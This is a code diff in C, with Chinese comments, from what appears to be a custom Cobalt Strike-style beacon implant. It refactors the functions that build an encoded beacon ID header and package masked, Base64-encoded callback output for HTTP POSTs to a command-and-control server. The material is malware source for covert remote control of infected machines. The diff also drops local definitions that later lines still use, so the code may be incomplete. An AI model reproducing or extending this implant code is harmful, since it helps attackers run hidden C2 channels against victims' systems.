@@ -205,15 +205,16 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
 }
 
 unsigned char* makeBeaconIdHeader() {
-    // clientID为 100000-999998 之间的偶数
-    DWORD digitCount = 6;  // clientID 位数
+    // clientID为 100000 - 999998 之间的偶数
+    // clientID 位数
+    DWORD digitCount = 6; 
 
     // 加终止符 '\0'
     int charArrayLength = digitCount + 1;
 
     unsigned char* charId = (unsigned char*)malloc(charArrayLength);
     if (!charId) {
-        fprintf(stderr, "Memory allocation failed for CharId\n");
+        fprintf(stderr, "Memory allocation failed\n");
         return NULL;
     }
 
@@ -232,7 +233,6 @@ unsigned char* makeBeaconIdHeader() {
     // 不用添加 \0
     unsigned char* MaskEncodeId = MaskEncode(charId, strlen(charId), &codelen);
 
-    char netbiosKey = 'A'; 
     size_t NetbiosEncodeIdLen;
 
     // NetBios
@@ -240,8 +240,14 @@ unsigned char* makeBeaconIdHeader() {
     // 不用添加 \0
     unsigned char* NetBoisId = NetbiosEncode(MaskEncodeId, codelen, netbiosKey, &NetbiosEncodeIdLen);
 
-    unsigned char* header = "User:";
     unsigned char* result = (unsigned char*)malloc(NetbiosEncodeIdLen + strlen(header) + strlen(Http_post_id_prepend) + strlen(Http_post_id_append) + 1);
+    if (!result) {
+        fprintf(stderr, "Memory allocation failed\n");
+        free(MaskEncodeId);
+        free(NetBoisId);
+        free(charId);
+        return NULL;
+	}
 
     // User:user=APNDCONJDOOBBMOKDPOB%%
     size_t offset = 0;
@@ -254,7 +260,6 @@ unsigned char* makeBeaconIdHeader() {
     memcpy(result + offset, Http_post_id_append, strlen(Http_post_id_append));
     offset += strlen(Http_post_id_append);
 
-    // 添加 '\0' 方便字符串处理
     result[offset] = '\0';
 
     free(MaskEncodeId);
@@ -274,20 +279,20 @@ unsigned char* makePostData(unsigned char* postMsg, size_t msgLen, int callback)
     // Base64
     unsigned char* data = base64Encode(MaskEncodedata, code_length);
 
-    unsigned char* dataString = (unsigned char*)malloc(strlen(data) + strlen(Http_post_client_output_prepend) + strlen(Http_post_client_output_append) + 1);
+    unsigned char* postData = (unsigned char*)malloc(strlen(data) + strlen(Http_post_client_output_prepend) + strlen(Http_post_client_output_append) + 1);
 
     // data = post%%
     // strcat 会自动写入 \0
-    if (dataString) {
-        strcpy(dataString, Http_post_client_output_prepend);
-        strcat(dataString, data);
-        strcat(dataString, Http_post_client_output_append);
+    if (postData) {
+        strcpy(postData, Http_post_client_output_prepend);
+        strcat(postData, data);
+        strcat(postData, Http_post_client_output_append);
     }
 
     free(finalPaket);
     free(data);
 	free(MaskEncodedata);
-    return dataString;
+    return postData;
 }
 
 BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeader) {
